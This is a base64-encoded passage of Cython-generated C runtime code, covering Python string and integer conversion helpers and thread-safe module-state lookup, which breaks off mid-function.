AgICAgICNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSQogICAgICAgIHVuaWNvZGVfbGVuZ3RoID0gUHlVbmljb2RlX0dldExlbmd0aChvKTsKICAgICAgICBpZiAodW5saWtlbHkodW5pY29kZV9sZW5ndGggPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgaWYgKHVubGlrZWx5KHVuaWNvZGVfbGVuZ3RoICE9ICpsZW5ndGgpKSB7CiAgICAgICAgICAgIFB5VW5pY29kZV9Bc0FTQ0lJU3RyaW5nKG8pOwogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KI2Vsc2UKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgICBpZiAobGlrZWx5KFB5VW5pY29kZV9JU19BU0NJSShvKSkpIHsKICAgICAgICAqbGVuZ3RoID0gUHlVbmljb2RlX0dFVF9MRU5HVEgobyk7CiAgICAgICAgcmV0dXJuIFB5VW5pY29kZV9Bc1VURjgobyk7CiAgICB9IGVsc2UgewogICAgICAgIFB5VW5pY29kZV9Bc0FTQ0lJU3RyaW5nKG8pOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQojZWxzZQogICAgcmV0dXJuIFB5VW5pY29kZV9Bc1VURjhBbmRTaXplKG8sIGxlbmd0aCk7CiNlbmRpZgojZW5kaWYKfQojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiBvLCBQeV9zc2l6ZV90ICpsZW5ndGgpIHsKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIHx8IF9fUFlYX0RFRkFVTFRfU1RSSU5H""X0VOQ09ESU5HX0lTX1VURjgKICAgIGlmIChQeVVuaWNvZGVfQ2hlY2sobykpIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0FzU3RyaW5nQW5kU2l6ZShvLCBsZW5ndGgpOwogICAgfSBlbHNlCiNlbmRpZgogICAgaWYgKFB5Qnl0ZUFycmF5X0NoZWNrKG8pKSB7CiNpZiAoQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUykgfHwgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAoZGVmaW5lZChQeUJ5dGVBcnJheV9BU19TVFJJTkcpICYmIGRlZmluZWQoUHlCeXRlQXJyYXlfR0VUX1NJWkUpKSkKICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfR0VUX1NJWkUobyk7CiAgICAgICAgcmV0dXJuIFB5Qnl0ZUFycmF5X0FTX1NUUklORyhvKTsKI2Vsc2UKICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfU2l6ZShvKTsKICAgICAgICBpZiAoKmxlbmd0aCA9PSAtMSkgcmV0dXJuIE5VTEw7CiAgICAgICAgcmV0dXJuIFB5Qnl0ZUFycmF5X0FzU3RyaW5nKG8pOwojZW5kaWYKICAgIH0gZWxzZQogICAgewogICAgICAgIGNoYXIqIHJlc3VsdDsKICAgICAgICBpbnQgciA9IFB5Qnl0ZXNfQXNTdHJpbmdBbmRTaXplKG8sICZyZXN1bHQsIGxlbmd0aCk7CiAgICAgICAgaWYgKHVubGlrZWx5KHIgPCAwKSkgewogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgICAgIH0KICAgIH0KfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfSXNUcnVlKFB5T2JqZWN0KiB4KSB7CiAgIGludCBpc190cnVlID0geCA9PSBQeV9UcnVlOwogICBpZiAoaXNfdHJ1ZSB8ICh4ID09IFB5X0ZhbHNlKSB8ICh4ID09IFB5X05vbmUpKSByZXR1cm4gaXNfdHJ1ZTsKICAgZWxzZSByZXR1cm4gUHlPYmplY3RfSXNUcnVlKHgpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWVBbmREZWNyZWYoUHlPYmplY3QqIHgpIHsKICAgIGludCByZXR2YWw7CiAgICBpZiAodW5saWtlbHkoIXgpKSByZXR1cm4gLTE7CiAgICByZXR2YWwgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoeCk7CiAgICBQeV9ERUNSRUYoeCk7CiAgICByZXR1cm4gcmV0dmFsOwp9CnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShQeU9iamVjdCogcmVzdWx0KSB7CiAgICBfX1B5eF9UeXBlTmFtZSByZXN1bHRfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKHJlc3VsdCkpOwogICAgaWYgKFB5TG9uZ19DaGVjayhyZXN1bHQpKSB7CiAgICAgICAgaWYgKFB5RXJyX1dhcm5Gb3JtYXQoUHlFeGNfRGVwcmVjYXRpb25XYXJuaW5nLCAxLAogICAgICAgICAgICAgICAgIl9faW50X18gcmV0dXJuZWQgbm9uLWludCAodHlwZSAiIF9fUHl4X0ZNVF9UWVBFTkFNRSAiKS4gICIKICAgICAgICAgICAgICAgICJUaGUgYWJpbGl0""eSB0byByZXR1cm4gYW4gaW5zdGFuY2Ugb2YgYSBzdHJpY3Qgc3ViY2xhc3Mgb2YgaW50IGlzIGRlcHJlY2F0ZWQsICIKICAgICAgICAgICAgICAgICJhbmQgbWF5IGJlIHJlbW92ZWQgaW4gYSBmdXR1cmUgdmVyc2lvbiBvZiBQeXRob24uIiwKICAgICAgICAgICAgICAgIHJlc3VsdF90eXBlX25hbWUpKSB7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShyZXN1bHRfdHlwZV9uYW1lKTsKICAgICAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgIl9faW50X18gcmV0dXJuZWQgbm9uLWludCAodHlwZSAiIF9fUHl4X0ZNVF9UWVBFTkFNRSAiKSIsCiAgICAgICAgICAgICAgICAgcmVzdWx0X3R5cGVfbmFtZSk7CiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7CiAgICBQeV9ERUNSRUYocmVzdWx0KTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU51bWJlcl9Mb25nKFB5T2JqZWN0KiB4KSB7CiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICBQeU51bWJlck1ldGhvZHMgKm07CiNlbmRpZgogIFB5T2JqZWN0ICpyZXMgPSBOVUxMOwogIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrKHgpKSkKICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZih4KTsKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogIG0gPSBQeV9UWVBFKHgpLT50cF9hc19udW1iZXI7CiAgaWYgKGxpa2VseShtICYmIG0tPm5iX2ludCkpIHsKICAgICAgcmVzID0gbS0+bmJfaW50KHgpOwogIH0KI2Vsc2UKICBpZiAoIVB5Qnl0ZXNfQ2hlY2tFeGFjdCh4KSAmJiAhUHlVbmljb2RlX0NoZWNrRXhhY3QoeCkpIHsKICAgICAgcmVzID0gUHlOdW1iZXJfTG9uZyh4KTsKICB9CiNlbmRpZgogIGlmIChsaWtlbHkocmVzKSkgewogICAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVja0V4YWN0KHJlcykpKSB7CiAgICAgICAgICByZXR1cm4gX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShyZXMpOwogICAgICB9CiAgfQogIGVsc2UgaWYgKCFQeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAiYW4gaW50ZWdlciBpcyByZXF1aXJlZCIpOwogIH0KICByZXR1cm4gcmVzOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfUHlJbmRleF9Bc1NzaXplX3QoUHlPYmplY3QqIGIpIHsKICBQeV9zc2l6ZV90IGl2YWw7CiAgUHlPYmplY3QgKng7CiAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChiKSkpIHsKICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAgIGlm""IChsaWtlbHkoX19QeXhfUHlMb25nX0lzQ29tcGFjdChiKSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZShiKTsKICAgIH0gZWxzZSB7CiAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKGIpOwogICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChiKTsKICAgICAgc3dpdGNoIChzaXplKSB7CiAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDIgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgIGNhc2UgLTI6CiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiAyICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgICAgY2FzZSAzOgogICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgcmV0dXJuIChQeV9zc2l6ZV90KSAoKCgoKCgoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgIGNhc2UgLTM6CiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiAzICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKCgoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgIGNhc2UgNDoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDQgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKCgoKCgoc2l6ZV90KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgICAgY2FzZSAtNDoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDQgKiBQeUxvbmdfU0hJRlQpIHsKICAg""ICAgICAgICAgIHJldHVybiAtKFB5X3NzaXplX3QpICgoKCgoKCgoKHNpemVfdClkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgIH0KICAgIH0KICAgICNlbmRpZgogICAgcmV0dXJuIFB5TG9uZ19Bc1NzaXplX3QoYik7CiAgfQogIHggPSBQeU51bWJlcl9JbmRleChiKTsKICBpZiAoIXgpIHJldHVybiAtMTsKICBpdmFsID0gUHlMb25nX0FzU3NpemVfdCh4KTsKICBQeV9ERUNSRUYoeCk7CiAgcmV0dXJuIGl2YWw7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfaGFzaF90IF9fUHl4X1B5SW5kZXhfQXNIYXNoX3QoUHlPYmplY3QqIG8pIHsKICBpZiAoc2l6ZW9mKFB5X2hhc2hfdCkgPT0gc2l6ZW9mKFB5X3NzaXplX3QpKSB7CiAgICByZXR1cm4gKFB5X2hhc2hfdCkgX19QeXhfUHlJbmRleF9Bc1NzaXplX3Qobyk7CiAgfSBlbHNlIHsKICAgIFB5X3NzaXplX3QgaXZhbDsKICAgIFB5T2JqZWN0ICp4OwogICAgeCA9IFB5TnVtYmVyX0luZGV4KG8pOwogICAgaWYgKCF4KSByZXR1cm4gLTE7CiAgICBpdmFsID0gUHlMb25nX0FzTG9uZyh4KTsKICAgIFB5X0RFQ1JFRih4KTsKICAgIHJldHVybiBpdmFsOwogIH0KfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfT3duZWRfUHlfTm9uZShpbnQgYikgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoYik7CiAgICByZXR1cm4gX19QeXhfTmV3UmVmKFB5X05vbmUpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlCb29sX0Zyb21Mb25nKGxvbmcgYikgewogIHJldHVybiBiID8gX19QeXhfTmV3UmVmKFB5X1RydWUpIDogX19QeXhfTmV3UmVmKFB5X0ZhbHNlKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5TG9uZ19Gcm9tU2l6ZV90KHNpemVfdCBpdmFsKSB7CiAgICByZXR1cm4gUHlMb25nX0Zyb21TaXplX3QoaXZhbCk7Cn0KCgoKI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAmJiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQojaWZuZGVmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCiNpZiAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwKQogICNkZWZpbmUgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgMQojZWxzZQogICNkZWZpbmUgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgMAojZW5kaWYKI2VuZGlmCiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRSAmJiAhQ1lUSE9OX0FUT01JQ1MKI2Vycm9yICJNb2R1bGUgc3RhdGUgd2l0aCBQRVA0ODkgcmVxdWlyZXMgYXRvbWljcy4gQ3VycmVudGx5IHRo""YXQncyBvbmUgb2ZcCiBDMTEsIEMrKzExLCBnY2MgYXRvbWljIGludHJpbnNpY3Mgb3IgTVNWQyBhdG9taWMgaW50cmluc2ljcyIKI2VuZGlmCiNpZiAhQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKQojZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCnN0YXRpYyBQeU11dGV4IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gezB9OwojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBQeU11dGV4X0xvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KQojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpIFB5TXV0ZXhfVW5sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2VsaWYgZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgX19jcGx1c3BsdXMgPj0gMjAxMTAzTAojaW5jbHVkZSA8bXV0ZXg+CnN0YXRpYyBzdGQ6Om11dGV4IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4OwojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleC5sb2NrKCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleC51bmxvY2soKQojZWxpZiBkZWZpbmVkKF9fU1REQ19WRVJTSU9OX18pICYmIChfX1NURENfVkVSU0lPTl9fID4gMjAxMTEyTCkgJiYgIWRlZmluZWQoX19TVERDX05PX1RIUkVBRFNfXykKI2luY2x1ZGUgPHRocmVhZHMuaD4Kc3RhdGljIG10eF90IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4OwpzdGF0aWMgb25jZV9mbGFnIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4X29uY2VfZmxhZyA9IE9OQ0VfRkxBR19JTklUOwpzdGF0aWMgdm9pZCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9pbml0aWFsaXplX211dGV4KHZvaWQpIHsKICAgIG10eF9pbml0KCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCwgbXR4X3BsYWluKTsKfQojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKVwKICBjYWxsX29uY2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4X29uY2VfZmxhZywgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfaW5pdGlhbGl6ZV9tdXRleCk7XAogIG10eF9sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBtdHhfdW5sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2VsaWYgZGVmaW5lZChIQVZFX1BUSFJFQURfSCkKI2luY2x1ZGUgPHB0aHJlYWQuaD4Kc3RhdGljIHB0aHJlYWRfbXV0ZXhfdCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRl""eCA9IFBUSFJFQURfTVVURVhfSU5JVElBTElaRVI7CiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIHB0aHJlYWRfbXV0ZXhfbG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgcHRocmVhZF9tdXRleF91bmxvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KQojZWxpZiBkZWZpbmVkKF9XSU4zMikKI2luY2x1ZGUgPFdpbmRvd3MuaD4gIC8vIHN5bmNoYXBpLmggb24gaXRzIG93biBkb2Vzbid0IHdvcmsKc3RhdGljIFNSV0xPQ0sgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXggPSBTUldMT0NLX0lOSVQ7CiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIEFjcXVpcmVTUldMb2NrRXhjbHVzaXZlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBSZWxlYXNlU1JXTG9ja0V4Y2x1c2l2ZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNlbHNlCiNlcnJvciAiTm8gc3VpdGFibGUgbG9jayBhdmFpbGFibGUgZm9yIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFLlwKIFJlcXVpcmVzIEMgc3RhbmRhcmQgPj0gQzExLCBvciBDKysgc3RhbmRhcmQgPj0gQysrMTEsXAogb3IgcHRocmVhZHMsIG9yIHRoZSBXaW5kb3dzIDMyIEFQSSwgb3IgUHl0aG9uID49IDMuMTMuIgojZW5kaWYKdHlwZWRlZiBzdHJ1Y3QgewogICAgaW50NjRfdCBpZDsKICAgIFB5T2JqZWN0ICptb2R1bGU7Cn0gX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZTsKdHlwZWRlZiBzdHJ1Y3QgewogICAgY2hhciBpbnRlcnByZXRlcl9pZF9hc19pbmRleDsKICAgIFB5X3NzaXplX3QgY291bnQ7CiAgICBQeV9zc2l6ZV90IGFsbG9jYXRlZDsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgdGFibGVbMV07Cn0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhOwojZGVmaW5lIF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSAzMgojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKc3RhdGljIF9fcHl4X2F0b21pY19pbnRfdHlwZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIgPSAwOwojZW5kaWYKI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCnN0YXRpYyBfX3B5eF9hdG9taWNfcHRyX3R5cGUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IDA7CiNlbHNlCnN0YXRpYyBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEgPSBOVUxMOwojZW5kaWYKc3RhdGljIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZCgKICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxl""KiB0YWJsZSwKICAgICAgICBQeV9zc2l6ZV90IGNvdW50LAogICAgICAgIGludDY0X3QgaW50ZXJwcmV0ZXJJZCkgewogICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogYmVnaW4gPSB0YWJsZTsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGVuZCA9IGJlZ2luICsgY291bnQ7CiAgICBpZiAoYmVnaW4tPmlkID09IGludGVycHJldGVySWQpIHsKICAgICAgICByZXR1cm4gYmVnaW47CiAgICB9CiAgICB3aGlsZSAoKGVuZCAtIGJlZ2luKSA+IF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSkgewogICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGhhbGZ3YXkgPSBiZWdpbiArIChlbmQgLSBiZWdpbikvMjsKICAgICAgICBpZiAoaGFsZndheS0+aWQgPT0gaW50ZXJwcmV0ZXJJZCkgewogICAgICAgICAgICByZXR1cm4gaGFsZndheTsKICAgICAgICB9CiAgICAgICAgaWYgKGhhbGZ3YXktPmlkIDwgaW50ZXJwcmV0ZXJJZCkgewogICAgICAgICAgICBiZWdpbiA9IGhhbGZ3YXk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZW5kID0gaGFsZndheTsKICAgICAgICB9CiAgICB9CiAgICBmb3IgKDsgYmVnaW4gPCBlbmQ7ICsrYmVnaW4pIHsKICAgICAgICBpZiAoYmVnaW4tPmlkID49IGludGVycHJldGVySWQpIHJldHVybiBiZWdpbjsKICAgIH0KICAgIHJldHVybiBiZWdpbjsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1N0YXRlX0ZpbmRNb2R1bGUoQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkgewogICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpOwogICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIGRhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKilfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEpOwogICAgewogICAgICAgIF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7CiAgICAgICAgaWYgKGxpa2VseShkYXRhKSkgewogICAgICAgICAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhKTsKICAgICAgICAgICAgaWYgKGxpa2VseShkYXRhID09IG5ld19kYXRhKSkgewogICAgICAgICAgICAgICAgZ290byByZWFkX2ZpbmlzaGVkOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9v""a3VwX3JlYWRfY291bnRlcik7CiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpOwogICAgICAgIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7CiAgICAgICAgZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7CiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7CiAgICB9CiAgcmVhZF9maW5pc2hlZDo7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIGRhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhOwojZW5kaWYKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGZvdW5kID0gTlVMTDsKICAgIGlmICh1bmxpa2VseSghZGF0YSkpIGdvdG8gZW5kOwogICAgaWYgKGRhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7CiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgZGF0YS0+Y291bnQpIHsKICAgICAgICAgICAgZm91bmQgPSBkYXRhLT50YWJsZStpbnRlcnByZXRlcl9pZDsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIGZvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKAogICAgICAgICAgICBkYXRhLT50YWJsZSwgZGF0YS0+Y291bnQsIGludGVycHJldGVyX2lkKTsKICAgIH0KICBlb